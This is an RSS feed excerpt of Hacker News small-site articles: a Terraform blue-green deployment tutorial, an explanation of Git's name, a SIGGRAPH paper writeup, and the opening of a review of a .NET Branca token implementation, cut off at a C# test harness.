<p>Now that we've created our images, we need to create the Terraform configuration. First, let's set up our DigitalOcean provider<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>, which will let us create and modify resources on DigitalOcean:</p>
<div><pre><code data-lang="hcl"><span>provider</span> <span>"digitalocean"</span> {
<span>  token</span> <span>=</span> <span>"YOUR_API_TOKEN_GOES_HERE"</span>
}
</code></pre></div><p>Next, let's create the application server. Note that the second two blocks are the same as the first two, but with <code>green</code> instead of <code>blue</code>:</p>
<div><pre><code data-lang="hcl"><span>data</span> <span>"digitalocean_droplet_snapshot" "blue"</span> {
<span>  name_regex</span>  <span>=</span> <span>"^blue-"</span>
<span>  region</span>      <span>=</span> <span>"nyc3"</span>
<span>  most_recent</span> <span>=</span> <span>true</span>
}

<span>resource</span> <span>"digitalocean_droplet" "blue"</span> {
<span>  name</span>  <span>=</span> <span>"blue"</span>
<span>  image</span>      <span>=</span> <span>data</span><span>.</span><span>digitalocean_droplet_snapshot</span><span>.</span><span>blue</span><span>.</span><span>id</span>
<span>  region</span>     <span>=</span> <span>"nyc3"</span>
<span>  size</span>       <span>=</span> <span>"s-1vcpu-1gb"</span>
<span>  monitoring</span> <span>=</span> <span>true</span>
}

<span>data</span> <span>"digitalocean_droplet_snapshot" "green"</span> {
<span>  name_regex</span>  <span>=</span> <span>"^green-"</span>
<span>  region</span>      <span>=</span> <span>"nyc3"</span>
<span>  most_recent</span> <span>=</span> <span>true</span>
}

<span>resource</span> <span>"digitalocean_droplet" "green"</span> {
<span>  name</span>  <span>=</span> <span>"green"</span>
<span>  image</span>      <span>=</span> <span>data</span><span>.</span><span>digitalocean_droplet_snapshot</span><span>.</span><span>green</span><span>.</span><span>id</span>
<span>  region</span>     <span>=</span> <span>"nyc3"</span>
<span>  size</span>       <span>=</span> <span>"s-1vcpu-1gb"</span>
<span>  monitoring</span> <span>=</span> <span>true</span>
}
</code></pre></div><p>The <code>digitalocean_droplet_snapshot.blue</code> data block retrieves the most recent machine image (like the one we just created with Packer) whose name starts with <code>blue-</code>. Then, the <code>digitalocean_droplet.blue</code> resource creates a server using that image.</p>
<p>If we run Terraform, it should spin up two servers with the images Packer just created:</p>
<p>Now we should have two application servers online: one with the blue image and one with the green image. At this point, we’ve already accomplished our immutable infrastructure goal. Creating a new image for a color with Packer and then running Terraform will entirely replace the server of that color.</p>
<p>For the blue/green deployment, Terraform needs to know which color should be promoted. We can pass that in from the command line when we run Terraform:</p>
<div><pre><code data-lang="hcl"><span>variable</span> <span>"color"</span> {
<span>  type</span>        <span>=</span> <span>string</span>
<span>  description</span> <span>=</span> <span>"Which set of servers should be promoted."</span>
  <span>validation</span> {
<span>    condition</span>     <span>=</span><span> var.color</span> <span>=</span><span></span><span>=</span><span> "blue" || var.color</span> <span>=</span><span></span><span>=</span> <span>"green"</span>
<span>    error_message</span> <span>=</span> <span>"The color must be blue or green."</span>
  }
}

<span>locals</span> {
<span>  promoted_servers</span> <span>=</span><span> var.color</span> <span>=</span><span></span><span>=</span> <span>"blue"</span> <span>?</span> <span>digitalocean_droplet</span><span>.</span><span>blue</span> <span>:</span> <span>digitalocean_droplet</span><span>.</span><span>green</span>
<span>  demoted_servers</span>  <span>=</span><span> var.color</span> <span>=</span><span></span><span>=</span> <span>"blue"</span> <span>?</span> <span>digitalocean_droplet</span><span>.</span><span>green</span> <span>:</span> <span>digitalocean_droplet</span><span>.</span><span>blue</span>
}
</code></pre></div><p>The <code>variable.color</code> block takes either <code>blue</code> or <code>green</code> as input. Terraform configuration is declarative, so the color we pass determines which set will be promoted.</p>
<p>The <code>locals</code> block below it creates two groups: one for the promoted servers, and one for the demoted servers. The color that makes up the <code>promoted_servers</code> group is the same one we passed in as <code>variable.color</code>; it contains the servers that will be promoted. The <code>demoted_servers</code> group, then, contains the current set of live servers that will be demoted.</p>
<p>Now we need to point our nginx load balancer at the correct set of servers. But before we can do that, we need to create the load balancer in the first place:</p>
<div><pre><code data-lang="hcl"><span>data</span> <span>"digitalocean_droplet_snapshot" "balancer"</span> {
<span>  name_regex</span>  <span>=</span> <span>"^balancer-"</span>
<span>  region</span>      <span>=</span> <span>"nyc3"</span>
<span>  most_recent</span> <span>=</span> <span>true</span>
}

<span>resource</span> <span>"digitalocean_droplet" "balancer"</span> {
<span>  name</span>       <span>=</span> <span>"balancer"</span>
<span>  image</span>      <span>=</span> <span>data</span><span>.</span><span>digitalocean_droplet_snapshot</span><span>.</span><span>balancer</span><span>.</span><span>id</span>
<span>  region</span>     <span>=</span> <span>"nyc3"</span>
<span>  size</span>       <span>=</span> <span>"s-1vcpu-1gb"</span>
<span>  monitoring</span> <span>=</span> <span>true</span>
}
</code></pre></div><p>I use Packer to provision the load balancer as well (which is why it uses a <code>digitalocean_droplet_snapshot</code> as its image) but you can provision it however you’d like.</p>
<p>For the purposes of this tutorial, we'll assume your load balancer is running nginx. Here’s the configuration<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup>:</p>
<div><pre><code data-lang="nginx"><span>upstream</span> <span>backend</span> <span>{</span>
  <span>%{</span> <span>for</span> <span>ip</span> <span>in</span> <span>promoted_servers</span> <span>~</span><span>}</span>
  <span>server</span> <span>${ip}</span><span>;</span>
  <span>%{</span> <span>endfor</span> <span>~</span><span>}</span>
  <span>%</span><span>{</span> <span>for</span> <span>ip</span> <span>in</span> <span>demoted_servers</span> <span>~</span><span>}</span>
  <span>server</span> <span>${ip}</span> <span>backup</span><span>;</span>
  <span>%{</span> <span>endfor</span> <span>~</span><span>}</span>
<span>}</span>

<span>server</span> <span>{</span>
  <span>listen</span> <span>80</span><span>;</span>

  <span>location</span> <span>/</span> <span>{</span>
    <span>proxy_pass</span> <span>http://backend</span><span>;</span>
  <span>}</span>
<span>}</span>
</code></pre></div><p>The relevant portion is that <code>upstream.backend</code> block up top. We use <a href="https://www.terraform.io/docs/configuration/functions/templatefile.html">Terraform’s templating capabilities</a> to enumerate <strong>both</strong> sets of servers. The demoted set is marked with the <a href="https://nginx.org/en/docs/http/ngx_http_upstream_module.html#backup">backup directive</a>, which means it will be passed requests only when the promoted set is unavailable. Listing both sets of upstream servers this way prevents requests from being dropped in case the promoted set isn't immediately ready to begin serving requests.</p>
<p>Unfortunately, Terraform doesn't have any built-in mechanisms for keeping this file up–to–date. That brings us to the final piece of the puzzle: the <a href="https://registry.terraform.io/providers/hashicorp/null/latest/docs/resources/resource">null resource</a>.</p>
<p>A null resource is an escape hatch within Terraform — a way to execute arbitrary code. We'll use it to update our load balancer with an nginx configuration containing the correct server IP addresses on every deploy. Here's what it looks like:</p>
<div><pre><code data-lang="hcl"><span>resource</span> <span>"null_resource" "provision_balancer"</span> {
<span>  triggers</span> <span>=</span> {
<span>    balancer</span> <span>=</span> <span>digitalocean_droplet</span><span>.</span><span>balancer</span><span>.</span><span>id</span>
<span>    servers</span> <span>=</span> <span>"${join(",", concat(local.promoted_servers.*.id, local.demoted_servers.*.id))}"</span>
  }

  <span>connection</span> {
<span>    type</span> <span>=</span> <span>"ssh"</span>
<span>    host</span> <span>=</span> <span>digitalocean_droplet</span><span>.</span><span>balancer</span><span>.</span><span>ipv4_address</span>
  }

  <span>provisioner</span> <span>"file"</span> {
<span>    content</span> <span>=</span> <span>templatefile</span><span>(</span><span>"./nginx.conf"</span><span>,</span> {
<span>      promoted_servers</span>    <span>=</span> <span>local</span><span>.</span><span>promoted_servers</span><span>.</span><span>*</span><span>.</span><span>ipv4_address</span>
<span>      demoted_servers</span> <span>=</span> <span>local</span><span>.</span><span>demoted_servers</span><span>.</span><span>*</span><span>.</span><span>ipv4_address</span>
    }<span>)</span>
<span>    destination</span> <span>=</span> <span>"/tmp/songrender.com"</span>
  }

  <span>provisioner</span> <span>"remote-exec"</span> {
<span>    inline</span> <span>=</span> <span>[</span>
      <span>"sudo mv /tmp/songrender.com /etc/nginx/sites-available/songrender.com"</span><span>,</span>
      <span>"sudo ln -sf /etc/nginx/sites-available/songrender.com /etc/nginx/sites-enabled/songrender.com"</span><span>,</span>
      <span>"sudo systemctl reload nginx"</span>
    <span>]</span>
  }
}
</code></pre></div><p>The top block, <code>triggers</code>, tells Terraform when it needs to execute the resource again. In our case, that should happen …</p></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jake.nyc/words/blue-green-deploys-and-immutable-infrastructure-with-terraform/">https://jake.nyc/words/blue-green-deploys-and-immutable-infrastructure-with-terraform/</a></em></p>]]>
            </description>
            <link>https://jake.nyc/words/blue-green-deploys-and-immutable-infrastructure-with-terraform/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24244166</guid>
            <pubDate>Sat, 22 Aug 2020 13:56:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Did Git Get Its Name?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24244038">thread link</a>) | @initialcommit
<br/>
August 22, 2020 | https://initialcommit.com/blog/How-Did-Git-Get-Its-Name | <a href="https://web.archive.org/web/*/https://initialcommit.com/blog/How-Did-Git-Get-Its-Name">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
			                <div>
			                    <p><img src="https://initialcommit.com/img/blog/how-did-git-get-its-name.png" title="How did Git get its name?" alt="Image of How did Git get its name?">
			                    </p>
			                    
			                    
			                    
			                    <h2>Introduction</h2>
<p>In this article, we will discuss why Linus Torvalds, the creator of Git, chose this name for his Version Control System (VCS).</p>
<h2>What is the meaning of Git?</h2>
<p>When Linus Torvalds made his initial commit of Git's code on April 7th 2005, he added a file called <code>README</code>. The first paragraph in this file reads:</p>
<pre><code>GIT - the stupid content tracker

"git" can mean anything, depending on your mood.

 - random three-letter combination that is pronounceable, and not 
   actually used by any common UNIX command.  The fact that it is a
   mispronunciation of "get" may or may not be relevant.
 - stupid. contemptible and despicable. simple. Take your pick from the 
   dictionary of slang.
 - "global information tracker": you're in a good mood, and it actually
   works for you. Angels sing, and a light suddenly fills the room. 
 - "goddamn idiotic truckload of sh*t": when it breaks

This is a stupid (but extremely fast) directory content manager.  It  
doesn't do a whole lot, but what it _does_ do is track directory
contents efficiently.
</code></pre>
<p>As we can see from the paragraph above, Linus kindly offers multiple explanations for Git's meaning:</p>
<ol>
<li>The first reason could be viewed as one of practicality. A three letter command is quick and easy to say and type.</li>
<li>The word "Git" is not used by any other existing Unix command.</li>
<li>The initial working version of Git's code was very simple, so much so that he finds it deserving of insult.</li>
<li>An acronym for <strong>Global Information Tracker</strong>, at least when it works properly.</li>
<li>An acronym for <strong>Goddamn Idiotic Truckload of sh*t</strong>, when it doesn't work properly.</li>
</ol>
<h2>Conclusion</h2>
<p>Using these five reasons for choosing the name "Git", we can try to answer the question "<em>What does Git stand for?</em>". It appears that Linus Torvalds wanted to make the point that a simple solution can solve a big and important problem. He also tried to acknowledge that there was much work to be done to build Git into a fully featured tool that could be truly useful for developers. After years of development, maybe the current version of Git isn't so stupid after all...</p>
<p>If you're interested in a great beginner book on using Git, I highly recommend <a href="https://www.amazon.com/gp/product/1449316387/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=1449316387&amp;linkCode=as2&amp;tag=initialcommit-20&amp;linkId=57e3e853b8ac3dfca936419601b4dbf8" target="_blank">Version Control with Git, by O'Reilly Media</a>. I read this book a few years ago and it clarified a lot of Git concepts and commands that I now use almost every day!</p>

			                    
							</div>
						</div></div>]]>
            </description>
            <link>https://initialcommit.com/blog/How-Did-Git-Get-Its-Name</link>
            <guid isPermaLink="false">hacker-news-small-sites-24244038</guid>
            <pubDate>Sat, 22 Aug 2020 13:38:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[IP Reputation or Irresponsible Recipients?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24243953">thread link</a>) | @worldofmatthew
<br/>
August 22, 2020 | https://mxroute.com/ip-reputation-or-irresponsible-recipients/ | <a href="https://web.archive.org/web/*/https://mxroute.com/ip-reputation-or-irresponsible-recipients/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://mxroute.com/ip-reputation-or-irresponsible-recipients/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24243953</guid>
            <pubDate>Sat, 22 Aug 2020 13:25:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Turning my side project into a paper at a top graphics conference]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24243874">thread link</a>) | @mkeeter
<br/>
August 22, 2020 | https://www.mattkeeter.com/projects/siggraph/ | <a href="https://web.archive.org/web/*/https://www.mattkeeter.com/projects/siggraph/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
<!-- End header -->






<h2>Or, "How I turned my side project into a paper at a top graphics conference"</h2>
<p>In my spare time between late 2019 and early 2020,
I wrote a <a href="https://www.mattkeeter.com/research/mpr">technical paper</a> which was accepted to
<a href="https://www.siggraph.org/">SIGGRAPH</a>.</p>
<p><a href="https://www.mattkeeter.com/research/mpr"><img src="https://www.mattkeeter.com/projects/siggraph/paper.png" alt="Paper"></a></p>
<p>SIGGRAPH is, by all accounts, the best research venue in computer graphics,
so I was aiming a bit high, but a man's gotta have hobbies.</p>
<p>This writeup is a behind-the-scenes look at the experience.
For example, you'll learn why 3/5 reviewers
recommended rejecting the paper,
and how I managed to change their minds in my rebuttal.</p>
<p>Hopefully, this will help folks considering a similar path;
this information is normally passed down through academic research groups,
so it's hard to know what to expect as an independent researcher.</p>
<h2>What's the paper about?</h2>
<p>(If you've read the paper, skip to the <a href="#timeline">timeline</a>)</p>
<p>You can <a href="https://www.mattkeeter.com/research/mpr/keeter_mpr20.pdf">read it</a> (PDF, 4.6 MB),
but I'll present a summary here.</p>
<p>The paper presents a new way to render closed-form <a href="https://en.wikipedia.org/wiki/Implicit_surface">implicit surfaces</a> on the GPU.</p>
<p>Our implicit surfaces are defined by a function \(f(x, y, z)\) which
can be evaluated at any point \((x, y, z)\) in space.
Where the function is <em>negative</em>, we're inside the shape;
where the function is <em>positive</em>, we're outside the shape.
The boundary of the shape is the <a href="https://en.wikipedia.org/wiki/Isosurface">isosurface</a>
\(f(x, y, z) = 0\).</p>
<p>"Closed-form" means the function is built from a bunch of math operations,
e.g.</p>
<p>$$\max\left(0.5 - \sqrt{x^2 + y^2}, \sqrt{x^2 + y^2} - 1\right) &lt; 0$$</p>
<p>(rather than a more powerful representation that supports looping or branching)</p>
<p>This is a simple and homogeneous representation, though it's very low-level.
Think of it as an assembly language for shapes:
painful to write manually,
but a reasonable target for higher-level tools.</p>
<p>We take this representation and convert it into a directed acyclic graph,
which deduplicates common subexpressions:</p>
<p><img src="https://www.mattkeeter.com/projects/siggraph/annulus.png" alt="Annulus"></p>
<p>Then, we convert this graph to a <em>tape</em>,
which is straight-line code that's equivalent to the DAG.
In this step, we perform <a href="https://en.wikipedia.org/wiki/Register_allocation">register allocation</a>
when deciding where to store intermediate results.</p>
<p><img src="https://www.mattkeeter.com/projects/siggraph/tape.png" alt="Tape"></p>
<p>We upload the tape to the GPU,
where the interesting work happens!</p>
<p>We evaluate the tape using <a href="https://en.wikipedia.org/wiki/Interval_arithmetic">interval arithmetic</a>,
which lets us check whether a particular region is inside, outside,
or on the shape's boundary.
Since we're on the GPU, this evaluation is done for many regions in parallel.</p>
<p>For regions that are ambiguous,
we subdivide them and recurse.
While recursing,
we prune the tapes to only contain active clauses,
which lets us do much less work in evaluating.</p>
<p>This evaluation process subdivides down to individual pixels / voxels,
which are then evaluated directly.  In 3D, we also use
<a href="https://en.wikipedia.org/wiki/Automatic_differentiation">automatic differentiation</a>
to estimate surface normals.</p>
<p>Here's what this looks like in 2D, rendering a quarter-circle:</p>
<p><img src="https://www.mattkeeter.com/projects/siggraph/recursion.png" alt="Recursion"></p>
<p>At a high level, this is all very similar to
<a href="http://fab.cba.mit.edu/classes/S62.12/docs/Duff_interval_CSG.pdf">Interval Arithmetic and Recursive Subdivision for Implicit Functions and Constructive Solid Geometry (Duff '92)</a>.
The interesting part of my paper is in adapting this algorithm
(which is deeply recursive with heterogenous workflows in each branch)
to run well on GPUs,
plus a bunch of real-world implementation details and benchmarks.</p>
<p>The pipeline works in both 2D and 3D.  In 2D, it produces black-and-white images,
while in 3D, it produces heightmaps and normals:</p>
<p><img src="https://www.mattkeeter.com/projects/siggraph/depth_norm.png" alt="Depth and normal images"></p>
<p>The paper concludes with benchmarking results and directions for future research.</p>

<h2>Timeline (2019-2020)</h2>
<p>Writing this paper filled about six months of my nights-and-weekends spare time,
with a mix of development, writing, editing, and waiting.</p>
<h3>May (2019) and earlier</h3>
<p>Back in grad school,
I worked on software for computer-aided design using
<a href="https://en.wikipedia.org/wiki/Function_representation">functional representations</a>
as the underlying model representation.</p>
<p>After graduation,
this work continued as a long-running side project,
with a <a href="https://www.mattkeeter.com/projects/kokopelli">few</a> <a href="https://www.mattkeeter.com/projects/antimony/">design</a> <a href="https://libfive.com/studio/">tools</a>
and an <a href="https://libfive.com/">open-source kernel</a>
that's used in both open-source and commercial CAD packages.
I'd made various <a href="https://github.com/libfive/libfive/commit/50ca3fd8ddd3db401ade3d1f2924e6adb27bd630">attempts</a>
over the years to put rendering on the GPU,
but without any success until now.</p>
<p>The most recent, successful work was inspired by
<a href="https://raphlinus.github.io/rust/graphics/gpu/2019/05/08/modern-2d.html">this blog post</a>
in May 2019.
I read through the blog post,
then skimmed the cited research papers
and reference implementation,
and started pondering whether a similar strategy
could work for functional representations.</p>
<h3>October-December (2019): Implementation</h3>
<p>The first tangible hints of this project are an October 11th entry in my engineering notebook,
boldly titled "GPU-Accelerated F-Rep Rendering" (click for full resolution).</p>
<p><a href="https://www.mattkeeter.com/projects/siggraph/notebook.jpg"><img src="https://www.mattkeeter.com/projects/siggraph/oct11.jpg" alt="Notebook"></a></p>
<p>The fascinating part, looking back, is how <em>close</em> this turned out to be –
it's not exactly what I ended up implementing and writing up,
but it's about 90% of the way there.</p>
<p>I started development on October 14th.
Out of the gate, I decided to use <a href="https://en.wikipedia.org/wiki/CUDA">CUDA</a> for GPU acceleration:
I've got an Macbook Pro from the NVIDIA days, so CUDA runs on it,
and I didn't want to make my life harder than necessary.
This would prove to be a good decision,
because I'd later use the same code to benchmark on
more powerful Linux workstations.</p>
<p>(As a side note, I have no idea what I'll do when this laptop dies –
I like Apple's hardware and software,
but also like being able to do cross-platform development)</p>
<p>The project started as a purely 2D renderer.
Like most GPU projects,
it had particularly aesthetic glitches:</p>
<p><img src="https://www.mattkeeter.com/projects/siggraph/glitches.png" alt="glitches"><br>
(October 26-29)</p>
<p>By mid-November,
the core 2D algorithm was working,
and I began implementing a demo GUI.
This was motivated in part by an upcoming visit to
my <a href="http://cba.mit.edu/">old research group</a>:
I wanted to show them what I was working on and get their feedback.</p>
<p>By November 17th, the GUI looked like this:</p>
<p><img src="https://www.mattkeeter.com/projects/siggraph/nov17.png" alt="2D GUI"></p>
<p>This reuses the <a href="http://libfive.com/studio/">Scheme bindings and standard library from <code>libfive</code></a>
which was a huge time saver.</p>
<p>The visit to CBA went well.
I had already convinced myself that I need 3D rendering
to make this a good paper, and they agreed.
Neil also suggested benchmarking against a brute-force renderer,
which led to Figure 5 in the final paper.</p>
<p>By November 27th, I had implemented 3D rendering:</p>
<p><img src="https://www.mattkeeter.com/projects/siggraph/nov27.png" alt="3D GUI"></p>
<p>At this point, I switched gears and started working on the paper itself.</p>
<h3>December (2019) - January (2020): Writing the paper</h3>
<p>The first commit in the paper repository is dated to December 1st.</p>
<p>There's a fair amount of infrastructure involved in writing a technical paper.</p>
<ul>
<li>LaTeX (which I already knew)</li>
<li>The <code>acmart</code> document class</li>
<li>Using BibTex to track sources</li>
<li>Writing a <code>Makefile</code> to compile the paper</li>
</ul>
<p>None of this is <em>hard</em>,
but it's time-consuming to learn and set up.
<a href="https://cs.dartmouth.edu/%7Ewjarosz/writing.html">This page</a>
is a great (if somewhat overwhelming) list of things to keep in mind when
writing a technical paper.
<a href="https://www.siggraph.org/sites/default/files/kajiya.pdf">How to Get Your SIGGRAPH Paper Rejected</a>
is another good reference, as is
<a href="https://graphics.stanford.edu/%7Ekayvonf/notes/systemspaper/">What Makes a (Graphics) Systems Paper Beautiful</a>.</p>
<p>I also leaned heavily on reading past papers, not just for content,
but for form.  <a href="https://www.cs.toronto.edu/%7Ejacobson/">Alec Jacobson's research group</a>
has published consistently strong SIGGRAPH papers,
and I often referred to the
<a href="https://www.cs.toronto.edu/%7Ejacobson/images/tetrahedral-meshing-in-the-wild-siggraph-2018-hu-et-al.pdf">TetWild paper</a>
(PDF)
when I had questions of style.</p>
<p>I traditionally visit family over Thanksgiving,
then stay in Boston over Christmas break for some downtime.
This year, writing the paper was my major project.
It's hard to say exactly how much time went into the writing of the paper,
but I spent a hour or two each evening working on it.</p>
<h4>Citing previous work</h4>
<p>I was extremely nervous about this section of the <a href="https://s2020.siggraph.org/submissions/technical-papers-submissions/">Technical Papers guidelines</a>:</p>
<blockquote>
<p>...a paper may also be rejected [before review] if it solves a problem that is known to be already solved;
does not cite (and the authors seem unaware of) important prior work on
the same problem and doesn't address how it is different;...</p>
</blockquote>
<p>This nervousness led to me spending a lot of time reviewing previous papers,
then tracking down their sources,
and so on.
I didn't read every word of every cited paper,
but I certainly looked at a <em>lot</em> of prior research,
both for inspiration and to compare against in the "Prior Work" section of the paper.</p>
<p>(Even then,
I got called out by the primary reviewer for citing "obscure" references
instead of more standard ones)</p>
<h4>Finding interesting demo models</h4>
<p>In the mesh world, there's a
<a href="https://en.wikipedia.org/wiki/List_of_common_3D_test_models">long list of common models</a>.
Sadly, there's no equivalent for implicit surfaces,
and despite my enthusiasm for 3D graphics, I'm a terrible 3D artist.</p>
<p>I tackled this from several angles.
First, I made a relatively straight-forward copy of the
<a href="https://en.wikipedia.org/wiki/Bethesda_Terrace_and_Fountain">Bethesda Terrace and Fountain</a>:</p>
<p><img src="https://www.mattkeeter.com/projects/siggraph/bridge.png" alt="Terrace bridge"></p>
<p>(based on a previous design by my wife)</p>
<p>Second, I reached out to <a href="http://raven.works/">Hazel</a>,
who has contributed to <a href="https://libfive.com/studio">Studio</a> in the past;
she graciously shared a bear head sculpture to use as an example in the paper:</p>
<p><img src="https://www.mattkeeter.com/projects/siggraph/bear.png" alt="Bear"></p>
<p>This model is a <em>particularly challenging</em> benchmark for my algorithm,
because it's built of smooth operations which can't be culled,
unlike hard-surface CSG modeling.</p>
<p>Finally, I dug up an involute gear model that has followed me around
<a href="https://www.mattkeeter.com/projects/kokopelli/">since 2013</a>,
which is an interesting middle ground:
it's primarily CSG, but uses expensive trigonometric functions.</p>
<p><img src="https://www.mattkeeter.com/projects/siggraph/gears.png" alt="Gears"></p>
<p>Of course,
the pattern of the three gears is a tribute to the venerable
<a href="https://www.x.org/archive/X11R7.0/doc/html/glxgears.1.html"><code>glxgears</code></a>.</p>
<h4>Making pictures pretty</h4>
<p>In early December,
I made a second visit to CBA to show off 3D rendering.
The main advice from this visit was that I needed
snazzy demo pictures.
In light of this feedback,
I implemented two new features:</p>
<ul>
<li>Rendering with perspective</li>
<li>Screen-space ambient occlusion</li>
</ul>
<h4>Benchmarking</h4>
<p>Since this was a systems paper,
I wanted to present benchmarking results to examine performance and scaling.
More importantly, the whole point of this research is to render things <em>fast</em>,
and my 2013 Macbook wasn't powerful enough to
claim "interactive framerates" with a straight face.</p>
<p><a href="https://galese.net/">Martin Galese</a> – a long-time friend –
founded <a href="https://patentmark.ai/">Patentmark</a>,
a startup which uses machine learning to improve the patent review process.
As part of this work,
he's got a hefty VR/ML workstation in his basement
to train ML models.
He was kind enough to give me an account on the machine,
so I could SSH in and run benchmarks on a relatively recent GPU.</p>
<p>This machine has a flagship 2017 GPU
(<a href="https://www.nvidia.com/en-sg/geforce/products/10series/geforce-gtx-1080-ti/">NVIDIA GTX 1080 Ti</a>)
but I was left wondering whether I could get access to anything bigger.</p>
<p>As it turns out, AWS will give you a
<a href="https://www.nvidia.com/en-us/data-center/v100/">Tesla V100</a>
for a mere $3.06/hour.
This is a truly absurd GPU,
intended for …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.mattkeeter.com/projects/siggraph/">https://www.mattkeeter.com/projects/siggraph/</a></em></p>]]>
            </description>
            <link>https://www.mattkeeter.com/projects/siggraph/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24243874</guid>
            <pubDate>Sat, 22 Aug 2020 13:07:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rolling your own crypto gone wrong: A look at a .NET Branca implementation]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24243750">thread link</a>) | @todsacerdoti
<br/>
August 22, 2020 | https://brycx.github.io/2020/08/22/a-look-at-a-branca-implementation.html | <a href="https://web.archive.org/web/*/https://brycx.github.io/2020/08/22/a-look-at-a-branca-implementation.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <h3 id="introduction">Introduction</h3>

<p>Some time back, I was looking at token authentication formats to authenticate some API calls. I didn’t even attempt to look at JWT &amp; Co. for <a href="https://paragonie.com/blog/2017/03/jwt-json-web-tokens-is-bad-standard-that-everyone-should-avoid">multiple reasons</a>. I landed between <a href="https://paseto.io/">PASETO</a> and <a href="https://branca.io/">Branca</a>.</p>

<p>I chose Branca for its simplicity. I needed authenticated API calls with a shared symmetric key. Both Branca and PASETO implemented this using XChaCha20-Poly1305, but PASETO also supports asymmetric authentication, which I didn’t need. I was quite pleased by looking at how straight-forward Branca <a href="https://github.com/tuupola/branca-spec#token-format">made it</a>:</p>
<div><div><pre><code>Version (1B) || Timestamp (4B) || Nonce (24B) || Ciphertext (*B) || Tag (16B)
</code></pre></div></div>

<p>Simply construct a header and encrypt and authenticate the payload using XChaCha20-Poly1305, with the header as the AAD.</p>

<p>Back then, there was only one <a href="https://github.com/thangchung/branca-dotnet">.NET implementation</a>, which targeted .NET Core whereas I needed .NET Framework. I took a quick look: there were no test vectors and used ChaCha20-Poly1305 instead of XChaCha20-Poly1305. It was only available GitHub, so I thought it may just be a toy project for fun. I dropped it and forgot about it.</p>

<p>Fast forward a couple of days ago, I returned to find <a href="https://github.com/scottbrady91/IdentityModel">a new</a> .NET Core implementation. It was also published as a NuGet, which got my hopes up - might be a polished implementation that I could get working on .NET Framework.</p>

<p><a href="https://www.nuget.org/packages/ScottBrady.IdentityModel/">ScottBrady.IdentityModel</a> is a relatively new NuGet, with three releases in total. Its first release was at the beginning of May this year and the latest was at the beginning of this August. It uses <a href="https://www.bouncycastle.org/csharp/index.html">BouncyCastle</a> for cryptographic implementations and offers both PASETO and Branca.</p>

<p>Note: All code discussed is based on the master branch at <a href="https://github.com/scottbrady91/IdentityModel/commit/4ff8a06719bd83a4129f45d2ce92f1891a51bd01">4ff8a06</a>. I’ll also be referring to this NuGet as just IdentityModel throughout the rest of this post.</p>

<h3 id="inspection">Inspection</h3>

<h4 id="tokenssecuritytokenexception-invalid-message-authentication-code">Tokens.SecurityTokenException: Invalid message authentication code</h4>

<p>I pulled down IdentityModel in a new project and took some <a href="https://github.com/tuupola/branca-js/blob/master/test.js">test vectors</a> from the JS reference implementation, which is linked in the specification for Branca.</p>

<div><div><pre><code><span>static</span> <span>void</span> <span>TestBranca</span><span>(</span><span>string</span> <span>expectedToken</span><span>,</span> <span>string</span> <span>expectedPayload</span><span>)</span> 
<span>{</span>
    <span>var</span> <span>handler</span> <span>=</span> <span>new</span> <span>BrancaTokenHandler</span><span>();</span>
    <span>var</span> <span>key</span> <span>=</span> <span>Encoding</span><span>.</span><span>UTF8</span><span>.</span><span>GetBytes</span><span>(</span><span>"supersecretkeyyoushouldnotcommit"</span><span>);</span>

    <span>try</span>
    <span>{</span>
        <span>var</span> <span>actualToken</span> <span>=</span> <span>handler</span><span>.</span><span>CreateToken</span><span>(</span><span>expectedPayload</span><span>,</span> <span>key</span><span>);</span>
        <span>var</span> <span>actualPayload</span> <span>=</span> <span>handler</span><span>.</span><span>DecryptToken</span><span>(</span><span>expectedToken</span><span>,</span> <span>key</span><span>);</span>
    <span>}</span>
    <span>catch</span> <span>(</span><span>Exception</span> <span>e</span><span>)</span>
    <span>{</span>
        <span>Console</span><span>.</span><span>WriteLine</span><span>(</span><span>"FAILED: \nexpectedToken: {0}\nexpectedPayload: {1}\nexception: {2}\n"</span><span>,</span> <span>expectedToken</span><span>,</span> <span>expectedPayload</span><span>,</span> <span>e</span><span>.</span><span>Message</span><span>);</span>
    <span>}</span>
<span>}</span>

<span>static</span> <span>void</span> <span>Main</span><span>(</span><span>string</span><span>[]</span> <span>args</span><span>)</span>
<span>{</span>
    <span>TestBranca</span><span>(</span><span>"870S4BYjk7NvyViEjUNsTEmGXbARAX9PamXZg0b3JyeIdGyZkFJhNsOQW6m0K9KnXt3ZUBqDB6hF4"</span><span>,</span> <span>"Hello world!"</span><span>);</span>
    <span>TestBranca</span><span>(</span><span>"89i7YCwtsSiYfXvOKlgkCyElnGCOEYG7zLCjUp4MuDIZGbkKJgt79Sts9RdW2Yo4imonXsILmqtNb"</span><span>,</span> <span>"Hello world!"</span><span>);</span>
